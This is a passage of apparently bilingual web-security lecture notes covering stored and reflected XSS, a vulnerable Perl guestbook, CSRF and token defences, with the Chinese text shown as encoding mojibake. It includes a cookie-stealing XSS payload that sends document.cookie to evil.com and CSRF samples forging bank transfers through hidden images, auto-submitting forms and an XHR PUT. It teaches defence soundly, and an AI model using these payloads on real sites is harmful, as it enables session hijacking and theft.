class=\"line\">    <span class=\"keyword\">close</span>( FILE );</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">open</span>( FILE, <span class=\"string\">&quot;guestbook.log&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&quot;Cannot open guestbook&quot;</span> );   <span class=\"regexp\">//</span>Open the guestbook file</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span> <span class=\"keyword\">while</span> ( &lt;FILE&gt; );      <span class=\"regexp\">//</span>Display the contents of the guestbook file</span><br><span class=\"line\"> <span class=\"keyword\">close</span>( FILE );</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span>( h4( <span class=\"string\">&quot;Please sign our guestbook:&quot;</span> ), start_form(),</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"string\">&quot;Name: &quot;</span>, textfield( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;name&quot;</span> ), br(),</span><br><span class=\"line\">     <span class=\"string\">&quot;E-mail: &quot;</span>, textfield( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;email&quot;</span> ), br(),</span><br><span class=\"line\">     <span class=\"string\">&quot;Enter your message:&quot;</span>, br(),</span><br><span class=\"line\">     textarea( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;message&quot;</span>, <span class=\"string\">-rows =&gt;</span> <span class=\"number\">5</span>, <span class=\"string\">-columns =&gt;</span> <span class=\"number\">50</span>, <span class=\"string\">-wrap =&gt;</span> <span class=\"number\">1</span> ),</span><br><span class=\"line\">     br(), submit( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;Sign the Guestbook&quot;</span> ), end_form(),</span><br><span class=\"line\"></span><br><span class=\"line\">     end_html() );</span><br></pre></td></tr></table></figure>\nè¯¥ Perl è„šæœ¬æ˜¯ä¸€ä¸ªåŸºæœ¬çš„è®¿å®¢ç•™è¨€ç°¿ç¨‹åºï¼Œå…è®¸ç”¨æˆ·è¾“å…¥å§“åã€ç”µå­é‚®ä»¶å’Œæ¶ˆæ¯å¹¶å°†å…¶ä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ (guestbook.log) ä¸­ã€‚ç¨‹åºè¿˜å¯ä»¥è¯»å–å¹¶æ˜¾ç¤ºæ—¥å¿—æ–‡ä»¶çš„å†…å®¹</li>\n</ul>\n</li>\n</ol>\n<ul>\n<li>ç”¨æˆ·è¾“å…¥æœªè¿‡æ»¤ï¼šç¨‹åºç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥æ¥ç”Ÿæˆ HTML è¾“å‡ºå’Œå†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–è½¬ä¹‰ï¼Œå®¹æ˜“å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚<ul>\n<li>ä¾‹å¦‚ï¼Œç”¨æˆ·åœ¨ <code>name</code> æˆ– <code>message</code> è¾“å…¥å­—æ®µä¸­æ’å…¥ <code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ï¼Œè¿™æ®µæ¶æ„ä»£ç å°†ä¼šåœ¨å…¶ä»–ç”¨æˆ·æŸ¥çœ‹ç•™è¨€ç°¿æ—¶è¢«æ‰§è¡Œã€‚</li>\n<li>æˆ–æ˜¯åœ¨ç•™è¨€æ—¶æ’å…¥HTMLæ”¹å˜é¡µé¢å¸ƒå±€</li>\n</ul>\n</li>\n<li>æ—¥å¿—æ–‡ä»¶çš„å¯å†™æ€§ï¼š<br>ç¨‹åºå°†ç”¨æˆ·çš„è¾“å…¥é™„åŠ åˆ°æ—¥å¿—æ–‡ä»¶ guestbook.logï¼Œä½†æ²¡æœ‰éªŒè¯æ–‡ä»¶æ˜¯å¦å­˜åœ¨æˆ–æ˜¯å¦å·²è¢«ä¿®æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶ç¯¡æ”¹æˆ–è¦†ç›–æ”»å‡»ã€‚<br><img data-src=\"https://img.picui.cn/free/2024/10/30/6722340e28890.png\" alt=\"img\"><table>\n<thead>\n<tr>\n<th align=\"center\"><img data-src=\"https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png\" alt=\"Image 1\"></th>\n<th align=\"center\"><img data-src=\"https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png\" alt=\"Image 2\"></th>\n</tr>\n</thead>\n</table>\n</li>\n</ul>\n<h2 id=\"Reflected (Non-Persistent) XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Reflected (Non-Persistent) XSS Attacks\">#</a>Reflected (Non-Persistent) XSS Attacks</h2>\n\n<ol>\n<li>Data supplied by an attacker is displayed in the response page <strong>without being stored on a server</strong><br>If the user input is displayed in the page<ul>\n<li>HTML tags can mess up the look of the page </li>\n<li>JavaScript can steal information or cause more advanced malicious behaviour  </li>\n<li>For only the current user</li>\n</ul>\n</li>\n<li>Example<br><img data-src=\"https://img.picui.cn/free/2024/10/30/672236eb773d1.png\" alt=\"img\"></li>\n</ol>\n<ul>\n<li>æ¶æ„ç½‘é¡µï¼ˆevil.comï¼‰<br>æ”»å‡»è€…åœ¨ <code>evil.com</code> ä¸Šåˆ›å»ºäº†ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ç½‘é¡µã€‚<br>é¡µé¢ä¸­åŒ…å«äº†ä¸€ä¸ªæŒ‡å‘ç›®æ ‡ç½‘ç«™çš„é“¾æ¥æˆ–è¡¨å•ï¼Œå…¶ä¸­å«æœ‰æ¶æ„çš„ JavaScript ä»£ç ã€‚ä¾‹å¦‚ï¼š<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://naive.com/hello.cgi?name=&lt;script&gt;win.open(&#x27;http://evil.com/steal.cgi?cookie=&#x27; + document.cookie)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\né“¾æ¥ä¸­çš„ <code>name</code> å‚æ•°æ˜¯ç”¨æ¥æ³¨å…¥ JavaScript ä»£ç çš„ã€‚ä»£ç è¯•å›¾å°†ç”¨æˆ·çš„ <code>cookie</code> ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆå³ <code>evil.com</code> çš„ <code>steal.cgi</code> è„šæœ¬ï¼‰ã€‚</li>\n<li>å—å®³è€…ç‚¹å‡»äº†æ¶æ„é“¾æ¥å¹¶è®¿é—®äº†ç›®æ ‡ç½‘é¡µã€‚<br>æµè§ˆå™¨å‘ naive.com å‘é€è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ name å‚æ•°ã€‚è¯·æ±‚çš„æ ·å¼ä¸ºï¼š<figure class=\"highlight javascript\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> /hello.<span class=\"property\">cgi</span>?name=<span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">win.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>\n<li>ç›®æ ‡ç½‘ç«™ï¼ˆnaive.comï¼‰<br>ç›®æ ‡ç½‘ç«™ naive.com å°†ç”¨æˆ·è¾“å…¥çš„ name å‚æ•°åŸå°ä¸åŠ¨åœ°åµŒå…¥åˆ°äº†å“åº”çš„ HTML é¡µé¢ä¸­ã€‚å“åº”é¡µé¢å¯èƒ½æ˜¯è¿™æ ·ï¼š<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">HTML</span>&gt;</span>Hello, dear </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">win.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>. Welcome!<span class=\"tag\">&lt;/<span class=\"name\">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>\nç”±äºæœªå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæµè§ˆå™¨å°† <code>script</code> æ ‡ç­¾ä½œä¸ºæ™®é€šçš„ JavaScript ä»£ç æ‰§è¡Œã€‚</li>\n<li>ç»“æœ<ul>\n<li>æµè§ˆå™¨æ‰§è¡Œäº†æ¶æ„ JavaScript ä»£ç ï¼Œæ‰“å¼€äº†ä¸€ä¸ªæ–°çš„çª—å£å¹¶å‘ <code>evil.com/steal.cgi</code> å‘é€äº†ç”¨æˆ·çš„ <code>cookie</code> ä¿¡æ¯ã€‚</li>\n<li>æ”»å‡»è€…é€šè¿‡è¿™ç§æ–¹å¼è·å–äº†å—å®³è€…çš„æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚èº«ä»½éªŒè¯ cookieï¼‰ï¼Œå¹¶å¯èƒ½è¿›ä¸€æ­¥è¿›è¡Œä¼šè¯åŠ«æŒã€‚</li>\n<li>è¿ååŒæºç­–ç•¥ï¼ˆSOPï¼‰ï¼šåŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼‰æ—¨åœ¨ä¿æŠ¤ç”¨æˆ·çš„æµè§ˆå™¨ä¸è¢«æ¶æ„è„šæœ¬è·¨ç«™æ”»å‡»ï¼ŒXSS æ”»å‡»ç›´æ¥è¿åäº†è¿™ä¸€ç­–ç•¥</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Reflected XSS Attack Details</li>\n</ol>\n<ul>\n<li>User is tricked into visiting an honest website </li>\n<li>Bug in website code causes userâ€™s browser to execute an arbitrary attack script <ul>\n<li>The origin of this script is now the website itself</li>\n</ul>\n</li>\n<li>Script can request sensitive data, control form fields on this page and linked pages <ul>\n<li>Can cause userâ€™s browser to attack other websites<br>Example: MySpace.com phishing attack injects a fake password field that sends password to attacker</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Stored XSS VS Reflected XSS\" class=\"active\"><a class=\"anchor\"  href=\"#Stored XSS VS Reflected XSS\">#</a>Stored XSS VS Reflected XSS</h2>\n\n<table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>å­˜å‚¨å‹ XSS (Stored XSS)</th>\n<th>åå°„å‹ XSS (Reflected XSS)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ä»£ç å­˜å‚¨</td>\n<td>æœåŠ¡å™¨ç«¯æŒä¹…å­˜å‚¨</td>\n<td>ä»…åœ¨è¯·æ±‚ä¸­åå°„</td>\n</tr>\n<tr>\n<td>æŒä¹…æ€§</td>\n<td>æŒä¹…æ€§ï¼Œå½±å“æ›´å¤šç”¨æˆ·</td>\n<td>éæŒä¹…æ€§ï¼Œé€šå¸¸åªå½±å“ç‰¹å®šç”¨æˆ·</td>\n</tr>\n<tr>\n<td>æ”»å‡»æ‰‹æ®µ</td>\n<td>åˆ©ç”¨æŒä¹…å­˜å‚¨ï¼ˆå¦‚æ•°æ®åº“ã€æ—¥å¿—ã€æ–‡ä»¶ç­‰ï¼‰</td>\n<td>é€šè¿‡æ¶æ„é“¾æ¥æˆ–è¡¨å•æäº¤è¯±å¯¼ç”¨æˆ·</td>\n</tr>\n<tr>\n<td>ç¤ºä¾‹åœºæ™¯</td>\n<td>è¯„è®ºåŒºã€è®ºå›å¸–å­ã€åšå®¢æ–‡ç« ã€ç”¨æˆ·ç®€ä»‹ç­‰</td>\n<td>é’“é±¼é‚®ä»¶ã€æ¶æ„é“¾æ¥ã€æœç´¢æŸ¥è¯¢ç­‰</td>\n</tr>\n<tr>\n<td>ä¿®å¤éš¾åº¦</td>\n<td>éš¾åº¦è¾ƒå¤§ï¼Œéœ€æ¸…ç†æœåŠ¡å™¨ä¸Šçš„æ¶æ„ä»£ç </td>\n<td>éš¾åº¦è¾ƒå°ï¼Œå¯é€šè¿‡è¾“å…¥éªŒè¯å’Œè½¬ä¹‰å¿«é€Ÿä¿®å¤</td>\n</tr>\n</tbody></table>\n<h2 id=\"Preventing XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Preventing XSS Attacks\">#</a>Preventing XSS Attacks</h2>\n\n<ol>\n<li>Input Filtering<br>è¿˜æ²¡æ‡‚å…ˆæ”¾ä¸ªé“¾æ¥åœ¨è¿™<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA==\">XSS Filter Evasion Cheat Sheet</span></li>\n<li>Framework validation</li>\n<li>Output Sanitisation</li>\n</ol>\n<ul>\n<li>Any user input and client-side data must be preprocessed before it is used inside HTML<ul>\n<li>PHP: <code>htmlspecialchars(string)</code> replaces all special characters with their HTML codeä¾‹å¦‚ï¼Œå°† <code>&lt;</code> è½¬æ¢ä¸º <code>&amp;lt;</code>ï¼Œ<code>&gt;</code> è½¬æ¢ä¸º <code>&amp;gt;</code>ï¼Œä»¥é˜²æ­¢è¿™äº›å­—ç¬¦è¢«æµè§ˆå™¨è§£é‡Šä¸º HTML æˆ–è„šæœ¬æ ‡ç­¾ã€‚ </li>\n<li>ASP.NET: <code>Server.HtmlEncode(string)</code> è¯¥æ–¹æ³•ä¼šå°†å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œç¡®ä¿æµè§ˆå™¨ä¸ä¼šå°†å…¶è§£é‡Šä¸ºå¯æ‰§è¡Œä»£ç ã€‚</li>\n</ul>\n</li>\n<li>è¿‡æ»¤å¯èƒ½ä¼šå°†è¾“å…¥è½¬æ¢æˆæ”»å‡»å½¢å¼<ul>\n<li>å¦‚æœé¢„å¤„ç†è¿‡ç¨‹ä¸­æœªå½»åº•æ¶ˆé™¤æ‰€æœ‰æ½œåœ¨å¨èƒï¼Œæœ‰å¯èƒ½ä»ä¼šå¯¼è‡´ XSS ç­‰æ”»å‡»ã€‚</li>\n<li>éœ€è¦åœ¨è¿‡æ»¤åå¤šæ¬¡å¾ªç¯æ£€æŸ¥ï¼Œå¹¶åœ¨æ£€æµ‹åˆ°æ¶æ„å†…å®¹æ—¶é‡æ–°åº”ç”¨è¿‡æ»¤ï¼Œç›´åˆ°ä¸å†å‘ç°æ½œåœ¨å¨èƒä¸ºæ­¢ã€‚</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Cross-Site Request Forgery\" class=\"active\"><a class=\"anchor\"  href=\"#Cross-Site Request Forgery\">#</a>Cross-Site Request Forgery</h1>\n\n<h2 id=\"CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#CSRF\">#</a>CSRF</h2>\n\n<ol>\n<li>Cross-Site Request Forgery (CSRF)</li>\n</ol>\n<ul>\n<li>A privileged user is tricked to perform an operation on the behalf of an attacker <ul>\n<li>Often through social engineering (such as sending a link via email or chat)</li>\n</ul>\n</li>\n<li>Usually unnoticed by the victim user <ul>\n<li>Requests are sent by the browser behind the scenes</li>\n</ul>\n</li>\n<li>CSRF exploits the trust that a web site has in a userâ€™s browser <ul>\n<li>XSS exploits the trust a user has for a particular site</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Characteristics of CSRF</li>\n</ol>\n<ul>\n<li>Web sites rely on a userâ€™s identity </li>\n<li>The site has trust in that identity </li>\n<li>The userâ€™s browser is tricked into sending HTTP requests to a target site </li>\n<li>Such HTTP requests have side effects <ul>\n<li>Because the attacker doesnâ€™t receive the response</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Example\" class=\"active\"><a class=\"anchor\"  href=\"#Example\">#</a>Example</h2>\nExample Descriptionï¼š\nAlice wishes to transfer $100 to Bob using the bank.com web application that is vulnerable to CSRF. Charlie, an attacker, wants to trick Alice into sending the money to Charlie instead. The attack will comprise the following steps: \n\n<ul>\n<li>Build an exploit URL or script </li>\n<li>Trick Alice into executing the action with social engineering</li>\n</ul>\n<ol>\n<li>Example: GET<br> A GET request from Alice to transfer money to Bob  <figure class=\"highlight ruby\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> <span class=\"symbol\">http:</span>/<span class=\"regexp\">/bank.com/transfer</span>.<span class=\"keyword\">do</span>?acct=<span class=\"variable constant_\">BOB</span>&amp;amount=<span class=\"number\">100</span> <span class=\"variable constant_\">HTTP</span>/<span class=\"number\">1.1</span></span><br></pre></td></tr></table></figure>\nCharlie first forges the following exploit URL<figure class=\"highlight ruby\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span>/<span class=\"regexp\">/bank.com/transfer</span>.<span class=\"keyword\">do</span>?acct=<span class=\"variable constant_\">CHARLIE</span>&amp;amount=<span class=\"number\">100000</span></span><br></pre></td></tr></table></figure>\nThen, Charlie tricks Alice into loading this URL <strong>when Alice is logged into the bank</strong>ä¾‹å¦‚é€šè¿‡å‘é€æ¶æ„ç”µå­é‚®ä»¶æˆ–åœ¨å…¶ä»–ç½‘ç«™ä¸Šç§æ¤æ¶æ„é“¾æ¥ã€‚<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span>&gt;</span>æŸ¥çœ‹æˆ‘çš„å›¾ç‰‡ï¼<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\næˆ–<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li>Example: POST<br>A POST request from Alice to transfer money to Bob<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">http://bank.com/transfer.do</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"> acct=BOB&amp;amount=100</span><br></pre></td></tr></table></figure>\nCharlie first crafts some hidden FORM tags <figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://bank.com/transfer.do&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;acct&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;CHARLIE&quot;</span>/&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;amount&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;100000&quot;</span>/&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;æŸ¥çœ‹æˆ‘çš„å›¾ç‰‡ï¼&quot;</span>/&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\nThen, Charlie tricks Alice to click on the submit button<br>Can also be executed automatically using JavaScript<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li>Example: Other HTTP Methods<br> Charlie can use HTTP PUT method that takes a JSON object as an argument<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PUT</span> <span class=\"string\">http://bank.com/transfer.do</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   &quot;acct&quot;: &quot;CHARLIE&quot;,</span><br><span class=\"line\">   &quot;amount&quot;: 100000</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\nSuch requests can be executed with JavaScript <figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"keyword\">function</span> <span class=\"title function_\">put</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> x = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">open</span>(<span class=\"string\">&quot;PUT&quot;</span>, <span class=\"string\">&quot;http://bank.com/transfer.do&quot;</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">setRequestHeader</span>(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;application/json&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">send</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(&#123;<span class=\"string\">&quot;acct&quot;</span>: <span class=\"string\">&quot;CHARLIE&quot;</span>, <span class=\"string\">&quot;amount&quot;</span>: <span class=\"number\">100000</span>&#125;));</span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"> </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Prevention CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#Prevention CSRF\">#</a>Prevention CSRF</h2>\n\n<ol>\n<li>Prevention Methods That Do Not Work<ol>\n<li>ä½¿ç”¨â€œç§˜å¯†â€Cookie  (Using a secret cookie) ï¼šåœ¨è¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ªâ€œç§˜å¯†â€Cookieï¼Œç”¨æ¥éªŒè¯è¯·æ±‚çš„åˆæ³•æ€§ã€‚<br>æ‰€æœ‰Cookieéƒ½ä¼šåœ¨æ¯ä¸ªè¯·æ±‚ä¸­è¢«è‡ªåŠ¨å‘é€ï¼Œæ— è®ºæ˜¯åˆæ³•è¯·æ±‚è¿˜æ˜¯ä¼ªé€ è¯·æ±‚ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å—å®³è€…çš„æµè§ˆå™¨è‡ªåŠ¨å‘é€è¿™äº›Cookieã€‚</li>\n<li>ä»…æ¥å—POSTè¯·æ±‚ (Only accepting POST requests) ï¼šé™åˆ¶ä»…æ¥å—POSTè¯·æ±‚æ¥æäº¤æ•æ„Ÿæ“ä½œçš„æ•°æ®ã€‚<br>æ”»å‡»è€…ä»ç„¶å¯ä»¥é€šè¿‡HTMLè¡¨å•ã€AJAXè¯·æ±‚æˆ–è‡ªåŠ¨æäº¤è„šæœ¬ï¼Œè¯±å¯¼å—å®³è€…æäº¤ä¼ªé€ çš„POSTè¯·æ±‚ã€‚å› æ­¤ï¼Œä»…ä½¿ç”¨POSTè¯·æ±‚å¹¶ä¸èƒ½å®Œå…¨é˜²æ­¢CSRFã€‚</li>\n<li>å¤šæ­¥äº‹åŠ¡å¤„ç† (Multi-step transactions) ï¼šå°†æ“ä½œåˆ†è§£ä¸ºå¤šä¸ªæ­¥éª¤ï¼Œå¹¶åœ¨æ¯ä¸€æ­¥ä¸­è¿›è¡Œç”¨æˆ·ç¡®è®¤ã€‚ï¼š<br>æ”»å‡»è€…å¯èƒ½é€šè¿‡è§‚å¯Ÿæˆ–çŒœæµ‹ï¼Œé¢„æµ‹æ¯ä¸€æ­¥çš„ç»“æœï¼Œå¹¶æ¨¡æ‹Ÿå®Œæ•´çš„äº‹åŠ¡æµç¨‹ã€‚å¦‚æœæ²¡æœ‰é¢å¤–çš„ä¿æŠ¤æœºåˆ¶ï¼ˆå¦‚CSRFä»¤ç‰Œï¼‰ï¼Œå¤šæ­¥æµç¨‹ä»ç„¶æ˜“å—CSRFæ”»å‡»ã€‚</li>\n<li>URLé‡å†™ (URL Rewriting)ï¼š åœ¨URLä¸­åŒ…å«ç”¨æˆ·çš„ä¼šè¯IDä»¥ç»´æŠ¤çŠ¶æ€ã€‚<br>å°†ä¼šè¯IDæš´éœ²åœ¨URLä¸­ï¼Œä¼šå¢åŠ è¢«æˆªè·æˆ–æ³„éœ²çš„é£é™©ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ç½‘ç»œæµé‡åˆ†æã€ä»£ç†æ—¥å¿—ã€æµè§ˆå™¨å†å²è®°å½•ç­‰æ–¹å¼è·å–ä¼šè¯IDã€‚</li>\n<li>HTTPSï¼šä½¿ç”¨HTTPSæ¥åŠ å¯†é€šä¿¡å†…å®¹ã€‚<br>HTTPSåªèƒ½åŠ å¯†ä¼ è¾“çš„å†…å®¹ï¼Œä¸èƒ½é˜²æ­¢ä¼ªé€ çš„è¯·æ±‚ã€‚æ”»å‡»è€…ä»å¯ä»¥é€šè¿‡å—å®³è€…çš„æµè§ˆå™¨å‘é€æœ‰æ•ˆçš„CSRFæ”»å‡»è¯·æ±‚ï¼Œå“ªæ€•æ˜¯HTTPSåŠ å¯†çš„è¯·æ±‚ã€‚</li>\n</ol>\n</li>\n<li>Prevent CSRF: Token-based mitigation</li>\n</ol>\n<ul>\n<li>A CSRF token is a unique, secret, unpredictable value<ul>\n<li>Generated by web applications and included on their own web pages<br><code>http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&amp;token=31415926535</code></li>\n</ul>\n</li>\n<li>Web applications reject requests if the token is missing or invalid <ul>\n<li>Impossible for an attacker to guess the token and construct a fully valid HTTP request</li>\n</ul>\n</li>\n<li>Types of CSRF tokens <ul>\n<li>Synchroniser token åŒæ­¥ä»¤ç‰Œï¼š<ul>\n<li>æœåŠ¡ç«¯ä¸ºæ¯ä¸ªä¼šè¯ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ä»¤ç‰Œï¼Œå¹¶åœ¨è¯·æ±‚ä¸­éªŒè¯è¯¥ä»¤ç‰Œã€‚</li>\n<li>å…¸å‹çš„åšæ³•æ˜¯åœ¨è¡¨å•ä¸­åµŒå…¥ä¸€ä¸ªéšè—å­—æ®µï¼Œæˆ–åœ¨URLä¸­é™„åŠ è¯¥ä»¤ç‰Œã€‚</li>\n<li>ç¼ºç‚¹æ˜¯éœ€è¦åœ¨æœåŠ¡ç«¯ä¿å­˜å’Œç®¡ç†ä»¤ç‰Œã€‚</li>\n</ul>\n</li>\n<li>encryption-based token åŠ å¯†ä»¤ç‰Œï¼š<ul>\n<li>ä½¿ç”¨åŠ 